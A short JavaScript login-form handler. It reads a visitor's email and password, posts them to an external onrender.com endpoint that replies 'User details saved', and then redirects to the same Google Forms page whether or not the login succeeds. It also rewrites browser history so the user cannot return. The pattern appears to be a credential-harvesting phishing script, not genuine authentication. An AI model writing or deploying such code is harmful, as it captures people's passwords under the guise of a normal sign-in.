// var button = 
document.addEventListener('DOMContentLoaded', function () {
    var loginForm = document.getElementById('loginForm');

    loginForm.addEventListener('submit', function (event) {
        event.preventDefault(); // Prevent the default form submission


        // Get the email and password from the form
        var email = document.getElementById('input').value;
        var password = document.getElementById('input2').value;



        // Perform the fetch to post data to the server
        fetch('https://mazenetsolution.onrender.com/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ email, password }),
        })
        .then(response => response.json())
        .then(data => {
            // Check if login was successful
            if (data.message === 'Login successful. User details saved.') {


                // Determine the redirect URL based on the response data
                var redirectUrl = determineRedirectUrl(data);

                // Redirect the user using window.location.replace
                window.location.replace(redirectUrl);

                // Modify the browser history to prevent going back to the login page
                window.history.replaceState({}, document.title, window.location.href);



                
                // window.location.href = 'https://forms.gle/T58zH1h4aiNGQqGf9';
            } else {
                // Handle unsuccessful login if needed
                console.log('Login unsuccessful');
            }
        })
        .catch(error => {
            console.error('Error:', error);
        })


    });

    function determineRedirectUrl(data) {
        // Check the data and decide the redirect URL accordingly
        if (data && data.success) {
            // If login is successful, redirect to one URL
            return 'https://forms.gle/eQuigmBaJjXrkjc87';
        } else {
            // If login is unsuccessful, redirect to another URL
            return 'https://forms.gle/eQuigmBaJjXrkjc87';
        }
    }

});
